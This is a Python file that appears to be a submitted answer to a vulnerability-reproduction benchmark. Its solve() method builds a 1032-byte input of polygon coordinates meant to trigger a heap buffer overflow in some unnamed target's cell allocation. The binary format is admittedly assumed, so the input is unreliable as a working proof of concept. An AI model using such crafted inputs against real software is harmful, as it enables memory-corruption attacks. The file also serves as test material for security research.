class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a PoC input of 1032 bytes to trigger heap buffer overflow
        # Assuming a binary format with header and repeated coordinate patterns
        # to create a complex polygon causing under-estimation in cell allocation
        poc = bytearray(1032)
        # Header: assume 4 bytes for num_points (e.g., 128 points)
        poc[0:4] = (128).to_bytes(4, 'little')
        # Fill with alternating coordinate values to create wiggly polygon
        # Each point: 4 bytes x, 4 bytes y (int32)
        for i in range(128):
            offset = 4 + i * 8
            x = (i * 100 % 10000) - 5000  # Varying x to cross cells
            y = (i * 101 % 10000) - 5000  # Varying y
            poc[offset:offset+4] = x.to_bytes(4, 'little', signed=True)
            poc[offset+4:offset+8] = y.to_bytes(4, 'little', signed=True)
        # Pad the rest if needed, but calculation: 4 + 128*8 = 4+1024=1028, add 4 bytes padding
        poc[1028:1032] = b'\x00\x00\x00\x00'
        return bytes(poc)
